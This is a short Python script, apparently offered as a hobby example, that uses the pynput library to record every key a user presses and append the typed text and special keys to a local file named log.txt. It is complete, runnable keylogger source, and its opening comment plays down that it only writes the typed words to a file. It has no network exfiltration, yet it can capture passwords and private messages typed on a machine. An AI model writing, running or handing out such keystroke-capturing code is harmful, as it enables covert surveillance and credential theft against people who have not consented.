# it only creates a file with the words typed !!

from pynput.keyboard import Key, Listener
import os




class KeyLogger():    

    def __init__(self):

        self.log = "INITIALING...   "

        # To avoid conflict !!
        if os.path.exists("log.txt"):
            os.remove("log.txt")
        
    def on_press(self, key):

        file = open("log.txt","a")

        try:

            file.write(str(key.char).replace("'",""))

        except AttributeError:                

            if key == Key.space:

                file.write(" ")

            elif key == Key.esc:

                file.write("ESC")

            elif key == Key.enter:

                file.write("\n")

            elif key == Key.backspace:
                
                file.write("<BACKSPACE>")
            
            else:                
            
                file.write(""+str(key)+"")
           
    def run(self):
        with Listener(on_press=self.on_press) as keyboard_listener:
            keyboard_listener.join()


keylogger = KeyLogger()
keylogger.run()
